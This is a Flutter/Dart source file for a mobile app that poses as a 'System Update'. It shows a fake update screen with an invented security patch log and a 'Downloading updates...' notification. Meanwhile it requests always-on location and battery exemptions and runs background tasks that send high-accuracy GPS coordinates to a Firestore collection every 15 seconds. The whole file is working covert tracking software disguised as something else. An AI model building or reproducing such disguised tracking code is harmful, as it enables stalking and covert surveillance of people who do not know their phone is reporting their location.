import 'dart:async';
import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_auth/firebase_auth.dart';
import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:flutter/material.dart';
import 'package:flutter_background_service/flutter_background_service.dart';
import 'package:flutter_background_service_android/flutter_background_service_android.dart';
import 'package:workmanager/workmanager.dart';
import 'package:geolocator/geolocator.dart';
import 'package:permission_handler/permission_handler.dart';

/// Annotate the onStart function so it can be invoked from native code.
@pragma('vm:entry-point')
void onStart(ServiceInstance service) async {
  // Ensure Flutter bindings are initialized in this isolate.
  WidgetsFlutterBinding.ensureInitialized();

  // Initialize Firebase in this background isolate.
  await Firebase.initializeApp();
  await FirebaseAuth.instance.signInAnonymously();

  // For Android, mark the service as foreground.
  if (service is AndroidServiceInstance) {
    service.setAsForegroundService();
  }

  // For testing: update location every 15 seconds.
  // In production, consider increasing this interval (e.g., to 5 minutes).
  Timer.periodic(Duration(seconds: 15), (timer) async {
    await updateLocation();
  });

  // Listen for a stop event from native code.
  service.on('stopService').listen((event) {
    service.stopSelf();
  });
}

/// Annotate the callbackDispatcher so it can be invoked from native code.
@pragma('vm:entry-point')
void callbackDispatcher() {
  Workmanager().executeTask((task, inputData) async {
    WidgetsFlutterBinding.ensureInitialized();
    await Firebase.initializeApp();
    await FirebaseAuth.instance.signInAnonymously();
    await updateLocation();
    return Future.value(true);
  });
}

/// This function gets the current location, prints it to the terminal,
/// and updates Firestore in the same document (using a custom document ID).

Future<void> updateLocation() async {
  try {
    Position position = await Geolocator.getCurrentPosition(
      desiredAccuracy: LocationAccuracy.high,
    );

    // Debug print the obtained location.
    print("Debug: Location obtained: ${position.latitude}, ${position.longitude}");

    // Use a custom document ID so that the same document is updated each time.
    String? customUID = FirebaseAuth.instance.currentUser?.uid;
    await FirebaseFirestore.instance.collection('locations').doc(customUID).set({
      'location': GeoPoint(position.latitude, position.longitude), // Use GeoPoint
      'timestamp': DateTime.now(),
    }, SetOptions(merge: true));

    print("Debug: Location updated in Firestore under document '$customUID' as GeoPoint.");
  } catch (e) {
    print("Error updating location: $e");
  }
}

/// Request necessary permissions.
Future<void> requestPermissions() async {
  await Permission.location.request();
  await Permission.locationAlways.request();  // For background location
  await Permission.ignoreBatteryOptimizations.request();
  // If targeting Android 13+, you might need:
  await Permission.notification.request();
}

Future<void> main() async {
  WidgetsFlutterBinding.ensureInitialized();

  // Initialize Firebase and sign in anonymously.
  await Firebase.initializeApp();
  await FirebaseAuth.instance.signInAnonymously();

  // Request necessary permissions.
  await requestPermissions();

  // Initialize WorkManager to schedule periodic tasks.
  await Workmanager().initialize(callbackDispatcher, isInDebugMode: false);
  await Workmanager().registerPeriodicTask(
    "location_task",
    "updateLocationTask",
    frequency: Duration(minutes: 15), // Adjust frequency as needed.
  );

  // Configure and start the Flutter background service.
  final service = FlutterBackgroundService();
  await service.configure(
    androidConfiguration: AndroidConfiguration(
      onStart: onStart,
      autoStart: true,
      isForegroundMode: true,
      notificationChannelId: 'location_service',
      initialNotificationTitle: 'System Update',
      initialNotificationContent: 'Downloading updates...',
      foregroundServiceNotificationId: 888,
      // Remove foregroundServiceType since it's not defined in your package.
    ),
    iosConfiguration: IosConfiguration(
      autoStart: true,
      onForeground: onStart,
    ),
  );
  service.startService();


  service.startService();

  runApp(MyApp());
}

class MyApp extends StatelessWidget {
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'System Update',
      theme: ThemeData(
        primarySwatch: Colors.blueGrey,
      ),
      home: HomeScreen(),
    );
  }
}

class HomeScreen extends StatelessWidget {
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(title: const Text("System Update")),
      body: Padding(
        padding: const EdgeInsets.all(16.0),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            const SizedBox(height: 20),
            const Text(
              "Checking for Updates...",
              style: TextStyle(fontSize: 20, fontWeight: FontWeight.bold),
            ),
            const SizedBox(height: 10),
            const Text(
              "Your system is checking for the latest updates to enhance security and performance.",
              style: TextStyle(fontSize: 16, color: Colors.grey),
            ),
            const SizedBox(height: 20),
            Center(child: CircularProgressIndicator()),
            const SizedBox(height: 30),
            const Text(
              "Update Log:",
              style: TextStyle(fontSize: 18, fontWeight: FontWeight.bold),
            ),
            const SizedBox(height: 10),
            Expanded(
              child: ListView(
                children: const [
                  ListTile(
                    leading: Icon(Icons.download, color: Colors.green),
                    title: Text("Security Patch - Version 5.1.2"),
                    subtitle: Text("Downloaded successfully"),
                  ),
                  ListTile(
                    leading: Icon(Icons.download, color: Colors.green),
                    title: Text("Performance Enhancements"),
                    subtitle: Text("Downloaded successfully"),
                  ),
                  ListTile(
                    leading: Icon(Icons.sync, color: Colors.orange),
                    title: Text("Applying Updates"),
                    subtitle: Text("System will restart after completion"),
                  ),
                ],
              ),
            ),
          ],
        ),
      ),
    );
  }
}
